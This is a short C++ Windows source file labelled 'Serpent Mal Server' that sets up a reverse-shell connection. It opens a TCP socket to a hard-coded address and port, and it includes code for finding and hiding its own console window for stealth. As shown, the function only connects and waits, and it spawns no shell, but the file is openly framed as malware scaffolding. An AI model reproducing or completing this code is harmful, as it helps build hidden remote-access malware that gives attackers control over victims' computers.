//Main headers
//Serpent Mal Server
#include <winsock2.h>       //Socket connection
#include <windows.h>        //Used for WinApi calls
#include <ws2tcpip.h>       //TCP-IP Sockets
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// Debug headers
#include <iostream>

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected. Hit <enter> to disconnect..." << std::endl;
        std::cin.get();
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

//Main Function
int main()
{
    HWND stealth;                                           // Declare a window handle
    AllocConsole();                                         // Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL);         // Find previous window handler and hide/show the window
    ShowWindow(stealth,SW_SHOWNORMAL);                      // SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console window
    RevShell();
    return 0;
}